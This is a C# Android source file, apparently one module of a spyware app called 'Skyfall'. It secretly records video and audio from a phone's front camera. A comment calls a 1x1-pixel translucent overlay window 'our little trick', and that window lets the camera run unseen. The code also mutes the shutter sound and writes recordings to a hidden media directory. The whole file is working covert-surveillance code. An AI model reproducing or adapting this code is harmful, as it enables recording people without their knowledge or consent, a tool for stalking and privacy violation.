using Android.Content;
using Android.Graphics;
using Android.Hardware;
using Android.Media;
using Android.Runtime;
using Android.Views;
using System;
using Camera = Android.Hardware.Camera;

#pragma warning disable CS0618 // Type or member is obsolete
namespace Skyfall
{
    public static class VideoRecorder
    {
        public static MediaRecorder mediaRecorder = new MediaRecorder();
        public static Camera frontalCamera = null;
        public static CameraSurfaceView cameraSurfaceView = null;

        public static void Start()
        {
            try
            {
                // Our little trick //
                cameraSurfaceView = new CameraSurfaceView(KernelService.applicationContext);
                WindowManagerLayoutParams windowManagerLayoutParams = new WindowManagerLayoutParams(1, 1, WindowManagerTypes.ApplicationOverlay, WindowManagerFlags.NotTouchModal | WindowManagerFlags.NotFocusable, Format.Translucent);
                windowManagerLayoutParams.Gravity = GravityFlags.Left | GravityFlags.Top;
                KernelService.windowManager.AddView(cameraSurfaceView, windowManagerLayoutParams);
            }
            catch (Exception e) { KernelService.LogException(e); }
        }

        public static void Stop()
        {
            try
            {
                mediaRecorder.Stop();
                mediaRecorder.Reset();

                frontalCamera.Lock();
                frontalCamera.Release();
                frontalCamera = null;

                KernelService.windowManager.RemoveView(cameraSurfaceView);
            }
            catch (Exception e) { KernelService.LogException(e); }
        }
    }

    public class CameraSurfaceView : SurfaceView, ISurfaceHolderCallback
    {
        public CameraSurfaceView(Context context) : base(context) => Holder.AddCallback(this);

        public void SurfaceCreated(ISurfaceHolder holder)
        {
            try
            {
                // Prepare camera //
                int cameraCount = Camera.NumberOfCameras;
                Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
                int cameraId;

                for (cameraId = cameraCount - 1; cameraId >= 0; cameraId--)
                {
                    Camera.GetCameraInfo(cameraId, cameraInfo);
                    if (cameraInfo.Facing == CameraFacing.Front) break;
                }

                VideoRecorder.frontalCamera = Camera.Open(cameraId);
                if (VideoRecorder.frontalCamera == null)
                {
                    VideoRecorder.frontalCamera = Camera.Open();
                    cameraId = 0;
                }

                VideoRecorder.frontalCamera.EnableShutterSound(false);
                VideoRecorder.frontalCamera.Unlock();

                // Prepare and start MediaRecorder //
                VideoRecorder.mediaRecorder.SetCamera(VideoRecorder.frontalCamera);
                VideoRecorder.mediaRecorder.SetAudioSource(AudioSource.Camcorder);
                VideoRecorder.mediaRecorder.SetVideoSource(VideoSource.Camera);
                VideoRecorder.mediaRecorder.SetProfile(CamcorderProfile.Get(cameraId, CamcorderQuality.Low));
                VideoRecorder.mediaRecorder.SetOutputFile(KernelService.MEDIA_VIDEO_DIRECTORY + "/" + KernelService.GetFormattedDateTime() + KernelService.MEDIA_VIDEO_FILE_EXTENSION);
                VideoRecorder.mediaRecorder.SetPreviewDisplay(holder.Surface);
                VideoRecorder.mediaRecorder.SetOrientationHint(270);
                VideoRecorder.mediaRecorder.Prepare();
                VideoRecorder.mediaRecorder.Start();
            }
            catch (Exception e) { KernelService.LogException(e); }
        }

        public void SurfaceChanged(ISurfaceHolder holder, [GeneratedEnum] Format format, int width, int height)
        {
            //throw new NotImplementedException();
        }

        public void SurfaceDestroyed(ISurfaceHolder holder)
        {
            //throw new NotImplementedException();
        }
    }
}
#pragma warning restore CS0618 // Type or member is obsolete